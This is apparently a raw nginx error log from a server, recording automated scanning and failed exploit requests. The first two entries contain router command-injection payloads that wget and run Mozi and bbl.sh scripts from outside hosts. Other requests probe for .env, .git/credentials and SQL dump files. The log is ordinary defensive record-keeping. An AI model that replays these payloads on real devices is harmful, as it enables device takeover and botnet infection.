2026/01/05 05:17:55 [error] 477#477: *130470 open() "/var/www/html/setup.cgi" failed (2: No such file or directory), client: 45.230.66.117, server: localhost-nginx-proxy-manager, request: "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://45.230.66.117:10580/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0"
2026/01/05 06:25:28 [error] 477#477: *130503 open() "/var/www/html/device.rsp" failed (2: No such file or directory), client: 130.12.180.108, server: localhost-nginx-proxy-manager, request: "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3B%20rm%20bbl.sh%3B%20wget%20http%3A%2F%2F130.12.180.85%2Ffile%2Fbbl.sh%3B%20busybox%20sh%20bbl.sh HTTP/1.1", host: "158.160.200.218:80"
2026/01/05 07:39:02 [error] 477#477: *130531 open() "/var/www/html/sdk" failed (2: No such file or directory), client: 138.68.107.204, server: localhost-nginx-proxy-manager, request: "POST /sdk HTTP/1.1", host: "158.160.200.218"
2026/01/05 07:39:02 [error] 478#478: *130530 open() "/var/www/html/odinhttpcall1767598742" failed (2: No such file or directory), client: 138.68.107.204, server: localhost-nginx-proxy-manager, request: "GET /odinhttpcall1767598742 HTTP/1.1", host: "158.160.200.218"
2026/01/05 07:39:02 [error] 477#477: *130533 open() "/var/www/html/HNAP1" failed (2: No such file or directory), client: 138.68.107.204, server: localhost-nginx-proxy-manager, request: "GET /HNAP1 HTTP/1.1", host: "158.160.200.218"
2026/01/05 07:39:02 [error] 477#477: *130534 open() "/var/www/html/evox/about" failed (2: No such file or directory), client: 138.68.107.204, server: localhost-nginx-proxy-manager, request: "GET /evox/about HTTP/1.1", host: "158.160.200.218"
2026/01/05 07:39:03 [error] 477#477: *130537 open() "/var/www/html/query" failed (2: No such file or directory), client: 157.230.111.59, server: localhost-nginx-proxy-manager, request: "GET /query?q=SHOW+DIAGNOSTICS HTTP/1.1", host: "158.160.200.218:80"
2026/01/05 07:39:03 [error] 477#477: *130538 open() "/var/www/html/solr/admin/info/system" failed (2: No such file or directory), client: 167.99.128.35, server: localhost-nginx-proxy-manager, request: "GET /solr/admin/info/system HTTP/1.1", host: "158.160.200.218:80"
2026/01/05 07:39:03 [error] 477#477: *130539 open() "/var/www/html/cgi-bin/authLogin.cgi" failed (2: No such file or directory), client: 134.209.245.114, server: localhost-nginx-proxy-manager, request: "GET /cgi-bin/authLogin.cgi HTTP/1.1", host: "158.160.200.218:80"
2026/01/05 07:39:03 [error] 478#478: *130541 open() "/var/www/html/v2/_catalog" failed (2: No such file or directory), client: 46.101.122.80, server: localhost-nginx-proxy-manager, request: "GET /v2/_catalog HTTP/1.1", host: "158.160.200.218:80"
2026/01/05 07:39:03 [error] 478#478: *130543 open() "/var/www/html/solr/admin/cores" failed (2: No such file or directory), client: 167.99.128.35, server: localhost-nginx-proxy-manager, request: "GET /solr/admin/cores?action=STATUS&wt=json HTTP/1.1", host: "158.160.200.218:80"
2026/01/05 07:48:20 [warn] 478#478: 512 worker_connections are not enough, reusing connections
2026/01/05 07:48:20 [alert] 478#478: *131554 512 worker_connections are not enough while connecting to upstream, client: 127.0.0.1, server: localhost-nginx-proxy-manager, request: "GET /favicon.ico HTTP/1.1", upstream: "http://127.0.0.1:80/favicon.ico", host: "158.160.200.218"
2026/01/05 07:48:24 [error] 477#477: *131556 open() "/var/www/html/.well-known/security.txt" failed (2: No such file or directory), client: 66.132.153.59, server: localhost-nginx-proxy-manager, request: "GET /.well-known/security.txt HTTP/1.1", host: "158.160.200.218"
2026/01/05 08:05:54 [error] 478#478: *131594 open() "/var/www/html/odinhttpcall1767600354" failed (2: No such file or directory), client: 161.35.213.254, server: localhost-nginx-proxy-manager, request: "GET /odinhttpcall1767600354 HTTP/1.1", host: "158.160.200.218"
2026/01/05 08:05:54 [error] 477#477: *131593 open() "/var/www/html/sdk" failed (2: No such file or directory), client: 161.35.213.254, server: localhost-nginx-proxy-manager, request: "POST /sdk HTTP/1.1", host: "158.160.200.218"
2026/01/05 08:05:54 [error] 478#478: *131595 open() "/var/www/html/HNAP1" failed (2: No such file or directory), client: 161.35.213.254, server: localhost-nginx-proxy-manager, request: "GET /HNAP1 HTTP/1.1", host: "158.160.200.218"
2026/01/05 08:05:54 [error] 478#478: *131596 open() "/var/www/html/evox/about" failed (2: No such file or directory), client: 161.35.213.254, server: localhost-nginx-proxy-manager, request: "GET /evox/about HTTP/1.1", host: "158.160.200.218"
2026/01/05 08:05:55 [error] 478#478: *131599 open() "/var/www/html/query" failed (2: No such file or directory), client: 46.101.113.54, server: localhost-nginx-proxy-manager, request: "GET /query?q=SHOW+DIAGNOSTICS HTTP/1.1", host: "158.160.200.218:80"
2026/01/05 08:05:55 [error] 478#478: *131600 open() "/var/www/html/v2/_catalog" failed (2: No such file or directory), client: 138.68.71.16, server: localhost-nginx-proxy-manager, request: "GET /v2/_catalog HTTP/1.1", host: "158.160.200.218:80"
2026/01/05 08:05:55 [error] 478#478: *131602 open() "/var/www/html/solr/admin/info/system" failed (2: No such file or directory), client: 104.248.248.69, server: localhost-nginx-proxy-manager, request: "GET /solr/admin/info/system HTTP/1.1", host: "158.160.200.218:80"
2026/01/05 08:05:55 [error] 478#478: *131601 open() "/var/www/html/cgi-bin/authLogin.cgi" failed (2: No such file or directory), client: 167.99.128.35, server: localhost-nginx-proxy-manager, request: "GET /cgi-bin/authLogin.cgi HTTP/1.1", host: "158.160.200.218:80"
2026/01/05 08:05:55 [error] 478#478: *131604 open() "/var/www/html/solr/admin/cores" failed (2: No such file or directory), client: 104.248.248.69, server: localhost-nginx-proxy-manager, request: "GET /solr/admin/cores?action=STATUS&wt=json HTTP/1.1", host: "158.160.200.218:80"
2026/01/05 08:18:59 [error] 477#477: *131623 open() "/var/www/html/.env" failed (2: No such file or directory), client: 64.225.33.87, server: localhost-nginx-proxy-manager, request: "GET /.env HTTP/1.1", host: "158.160.200.218"
2026/01/05 08:19:00 [error] 477#477: *131624 open() "/var/www/html/.git/config" failed (2: No such file or directory), client: 64.225.33.87, server: localhost-nginx-proxy-manager, request: "GET /.git/config HTTP/1.1", host: "158.160.200.218"
2026/01/05 09:07:08 [alert] 478#478: *132594 512 worker_connections are not enough while connecting to upstream, client: 127.0.0.1, server: localhost-nginx-proxy-manager, request: "GET /favicon.ico HTTP/1.1", upstream: "http://127.0.0.1:80/favicon.ico", host: "158.160.200.218"
2026/01/05 09:32:52 [error] 477#477: *132605 open() "/var/www/html/.git/credentials" failed (2: No such file or directory), client: 94.26.88.31, server: localhost-nginx-proxy-manager, request: "GET /.git/credentials HTTP/1.1", host: "158.160.200.218"
2026/01/05 09:35:46 [error] 477#477: *132607 open() "/var/www/html/GponForm/diag_Form" failed (2: No such file or directory), client: 36.255.4.128, server: localhost-nginx-proxy-manager, request: "POST /GponForm/diag_Form?images/ HTTP/1.1", host: "127.0.0.1:80"
2026/01/05 09:46:37 [warn] 478#478: 512 worker_connections are not enough, reusing connections
2026/01/05 09:46:37 [warn] 477#477: 512 worker_connections are not enough, reusing connections
2026/01/05 09:46:37 [alert] 477#477: *133625 512 worker_connections are not enough while connecting to upstream, client: 127.0.0.1, server: localhost-nginx-proxy-manager, request: "GET /favicon.ico HTTP/1.1", upstream: "http://127.0.0.1:80/favicon.ico", host: "158.160.200.218"
2026/01/05 11:09:06 [error] 483#483: *133654 open() "/var/www/html/portal/redlion" failed (2: No such file or directory), client: 20.80.105.86, server: localhost-nginx-proxy-manager, request: "GET /portal/redlion HTTP/1.1", host: "158.160.200.218"
2026/01/05 11:16:17 [error] 482#482: *133655 open() "/var/www/html/dump.sql" failed (2: No such file or directory), client: 137.184.86.0, server: localhost-nginx-proxy-manager, request: "GET /dump.sql HTTP/1.1", host: "158.160.200.218"
2026/01/05 11:16:17 [error] 482#482: *133656 open() "/var/www/html/database.sql" failed (2: No such file or directory), client: 137.184.86.0, server: localhost-nginx-proxy-manager, request: "GET /database.sql HTTP/1.1", host: "158.160.200.218"
2026/01/05 11:16:18 [error] 482#482: *133657 open() "/var/www/html/data.sql" failed (2: No such file or directory), client: 137.184.86.0, server: localhost-nginx-proxy-manager, request: "GET /data.sql HTTP/1.1", host: "158.160.200.218"
2026/01/05 11:16:19 [error] 482#482: *133658 open() "/var/www/html/setup.sql" failed (2: No such file or directory), client: 137.184.86.0, server: localhost-nginx-proxy-manager, request: "GET /setup.sql HTTP/1.1", host: "158.160.200.218"
